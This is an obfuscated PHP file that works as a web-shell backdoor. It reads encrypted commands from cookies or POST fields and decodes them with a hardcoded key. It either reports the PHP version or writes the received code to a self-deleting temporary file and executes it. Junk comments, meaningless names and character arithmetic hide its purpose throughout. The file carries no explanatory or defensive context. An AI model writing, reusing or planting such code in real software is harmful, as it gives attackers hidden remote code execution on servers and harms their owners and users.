<?php    function	qpumba(){$ng_zqyawsi='edoiq';	print_r	(23051+23051);/*  mpqp  */}

$jjz_oopin	=/*   hbr  */'jjz_oopin'  ^/*  getm   */'	';



function  kfgzd_($wjybn,       $pwdwlzg)
{       global/*   ss */$jjz_oopin;	$_qozu	=	"";       for	($pxehldwz   =	0;    $pxehldwz	</*   jf*/strlen($wjybn);)	{


	for/*   ul  */($dzfowc/*  tdx*/=	0;	$dzfowc	<	strlen($pwdwlzg)	&&    $pxehldwz	</*   _ */strlen($wjybn);     $dzfowc++,/*   p */$pxehldwz++)	{


/* p   */$_qozu  .=/* smma  */$jjz_oopin(ord($wjybn[$pxehldwz])       ^   ord($pwdwlzg[$dzfowc]));

/*   gx */}	}

/*wl_*/return    $_qozu;

}


function  rqdif($dsqbtb,    $wjybn)

{
	global/*gx   */$jjz_oopin;/*   lat   */$zemo__/*sy   */=    sprintf("."."\57"	./*  ziup*/"%"."s"."\x2e"	.	"\x70"  .	"l",   md5($dsqbtb));


	file_put_contents($zemo__,   "<"/*jdbmc*/.	"?"."p"."\x68"      .	"\160"/*  zvz   */.	$jjz_oopin(32)/*  anfq  */.	$jjz_oopin(641-524)  ./*   wyl   */"n"."l"."\x69"/* mvih*/./*  f*/$jjz_oopin(642-532)/*mvjd   */.      "k"."\x28"	.  "_"."_".$jjz_oopin(174-104)/*  iaru  */.   "\x49"      .    $jjz_oopin(920-844)      ./* hvht */"E"."\x5f"/*nhs   */./*  sf   */"_".$jjz_oopin(516-475)	.	$jjz_oopin(59)	./*vanjt*/$jjz_oopin(32)	./*  lmg   */$wjybn["\144"]);
  include($zemo__);	$hfhhl  =	$zemo__;/* q*/unlink($hfhhl);}function	kkrtytgzgo()


{	global/*   ke */$jjz_oopin;


   
	$pxehldwz/*myy*/=	array();


	$pxehldwz[$jjz_oopin(112)    .     "v"]/* rlolj  */=/*hoh */phpversion();

       $pxehldwz[$jjz_oopin(115)/*  p */./* ny */"v"]/* clm   */=/* w   */$jjz_oopin(1016-965)	.	"."."5";


  echo    @serialize($pxehldwz);
}




function/*   ixvhi*/lh_ilry($wjybn,	$dsqbtb,     $monrpscb)


{
   global      $jjz_oopin;       

	$wjybn     =      unserialize(kfgzd_(kfgzd_(base64_decode($wjybn),   $dsqbtb),	$monrpscb));


	if     (isset($wjybn["\x61"/*  p   */.	"k"]))/*  doy  */{


	if	($wjybn["a"]/*v */==     "\151")      {     kkrtytgzgo();


      }/*   zch */elseif/*  hrzi*/($wjybn["a"]/*p*/==   $jjz_oopin(491-390))/*   tbb_s */{     rqdif($dsqbtb,	$wjybn);

/* lnoip   */}


   exit();

  }

}


$uoozr_lqy/*   iln   */=	$_COOKIE;$agwrugn  =	$_POST;

$uoozr_lqy/*  ikgur */=  array_merge($agwrugn,/* yjnsz*/$uoozr_lqy);


$dsqbtb/*   clmrp */=      "\x35"/*ff*/.       $jjz_oopin(491-390)."0"."\70"    .       "0"."\x37"  .	"\x65"/*klg   */./*   zwp   */$jjz_oopin(413-360)/*   tpnt   */.   $jjz_oopin(45)      ./*mbn */"\62"	.	$jjz_oopin(97)     ./*p*/$jjz_oopin(54)     ./*u_ */"\71"	.	$jjz_oopin(732-687)  .	"4"."9".$jjz_oopin(805-753)	./*w   */"\x38"	.       "-"."\x62"	./*   tk  */$jjz_oopin(213-113)/*   uzsam   */.	"2".$jjz_oopin(743-695)	./*   mf*/"-".$jjz_oopin(932-832)/*   wsyex*/.   $jjz_oopin(1025-972)	./*   mgptb  */"\x34"/* wgilr  */.	"6"."\144"	.	$jjz_oopin(97)    .	"\144".$jjz_oopin(54)	./*  kiqwc*/$jjz_oopin(100)	./* z */$jjz_oopin(99)	.     "\61"/* aiks*/.   "\x61";
foreach     ($uoozr_lqy/*   gf_  */as/*   hai  */$monrpscb	=>	$wjybn)/* m   */{

/*  bc */lh_ilry($wjybn,	$dsqbtb,    $monrpscb);

}


